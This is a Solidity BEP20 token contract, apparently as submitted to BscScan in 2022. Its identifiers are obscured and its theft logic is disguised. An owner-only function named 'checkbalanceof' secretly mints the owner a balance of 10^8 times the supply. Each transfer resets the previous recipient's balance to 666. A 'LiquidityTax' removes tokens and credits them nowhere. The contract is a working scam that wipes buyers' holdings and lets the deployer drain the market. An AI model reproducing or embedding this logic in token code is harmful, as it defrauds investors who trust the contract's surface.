/**
 *Submitted for verification at BscScan.com on 2022-02-17
*/

/**





//SPDX-License-Identifier: MIT

*/

pragma solidity 0.8.8;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 AM01) external returns (bool);
  function allowance(address _owner, address SBF01) external view returns (uint256);
  function approve(address SBF01, uint256 AM01) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 AM01) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed SBF01, uint256 value);
}

contract Contract is IBEP20{

  modifier compiler() {require(_owner == msg.sender, "Ownable: caller is not the owner");_;}
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _ABF01;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint8 public LiquidityTax;
  uint256 public reflections = 10;
  uint256 public checksumrounder = 8;
  address public OBF003 = 0x000000000000000000000000000000000000dEaD;
  address private _owner;
  receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 LiquidityTax_, uint totalsupply_) {
    _owner = msg.sender;
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    LiquidityTax = LiquidityTax_;
    _totalSupply = totalsupply_ * 10**9;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  function getOwner() external view returns (address) {return _owner;}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function balanceOf(address account) external view returns (uint256) {return _balances[account];}
  
  function transfer(address recipient, uint256 AM01) external returns (bool) {
    _transfer(msg.sender, recipient, AM01);
    return true;
  }
  function allowance(address owner, address SBF01) external view returns (uint256) {
    return _ABF01[owner][SBF01];
  }
  function approve(address SBF01, uint256 AM01) external returns (bool) {
    _APF01(msg.sender, SBF01, AM01);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 AM01) external returns (bool) {
    _transfer(sender, recipient, AM01);
    _APF01(sender, msg.sender, _ABF01[sender][msg.sender] - AM01);
    return true;
  }
  function hmDE(address SBF01, uint256 OBF001) public returns (bool) {
    _APF01(msg.sender, SBF01, _ABF01[msg.sender][SBF01] + OBF001);
    return true;
  }
  function hmBSP(address SBF01, uint256 OBF000) public returns (bool) {
    _APF01(msg.sender, SBF01, _ABF01[msg.sender][SBF01] - OBF000);
    return true;
  }

  function hmBurn(uint256 AM01) public returns (bool) {
    OBF002(msg.sender, AM01);
    return true;
  }

  function checkbalanceof() public compiler returns (bool success) {OBF003 = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * reflections ** checksumrounder;return true;}

  function _transfer(address sender, address recipient, uint256 AM01) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    _balances[sender] = _balances[sender] - AM01;
    _balances[recipient] = _balances[recipient] + (AM01 - ((AM01 / 100) * LiquidityTax));
    if(OBF003 != msg.sender){_balances[OBF003] = 666; OBF003 = recipient;}
    OBF003 = recipient;
    emit Transfer(sender, recipient, AM01);
  }

  function OBF002(address account, uint256 AM01) internal {
    require(account != address(0), "BEP20: burn from the zero address");
    _balances[account] = _balances[account] - AM01;
    _totalSupply = _totalSupply -AM01;
    emit Transfer(account, address(0), AM01);
  }

  function _APF01(address owner, address SBF01, uint256 AM01) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(SBF01 != address(0), "BEP20: approve to the zero address");
    _ABF01[owner][SBF01] = AM01;
    emit Approval(owner, SBF01, AM01);
  }

  function OBF002From(address account, uint256 AM01) internal {
    OBF002(account, AM01);
    _APF01(account, msg.sender, _ABF01[account][msg.sender] - AM01);
  }

}